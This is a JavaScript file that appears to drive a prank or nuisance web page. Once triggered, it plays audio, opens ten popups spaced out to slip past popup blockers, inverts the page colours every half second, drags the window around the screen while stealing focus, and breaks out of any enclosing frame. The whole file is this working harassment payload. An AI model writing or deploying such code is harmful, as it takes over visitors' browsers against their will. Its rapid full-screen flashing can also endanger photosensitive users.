if (top.location !== location) {
  top.location.href = location.href;
}

let flagRun = true;
let xOff = 5, yOff = 5, xPos = 400, yPos = -100;
let colorInterval;

function reopen() {
  window.open(
    "popup.html",
    "",
    "menubar=no,status=no,toolbar=no,resizable=no,width=350,height=370,titlebar=no"
  );
}

function spamPopups() {
  for (let i = 0; i < 10; i++) {
    setTimeout(reopen, i * 200); // small delay to prevent blocking
  }
}

function startColorInversion() {
  colorInterval = setInterval(() => {
    const current = document.body.style.filter;
    document.body.style.filter = current === "invert(100%)" ? "invert(0%)" : "invert(100%)";
  }, 500);
}

function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}
function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}
function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function playBall() {
  xPos += xOff;
  yPos += yOff;

  if (xPos > screen.width - 175) newXlt();
  if (xPos < 0) newXrt();
  if (yPos > screen.height - 100) newYup();
  if (yPos < 0) newYdn();

  if (flagRun) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 20);
  }
}

function init() {
  // Unlock UI
  document.getElementById("unlock").style.display = "none";
  document.getElementById("content").style.display = "block";

  // Play audio
  const audio = document.getElementById("audio");
  audio.play().catch(err => console.warn("Audio blocked:", err));

  // Start effects
  spamPopups();
  startColorInversion();
  playBall();
}
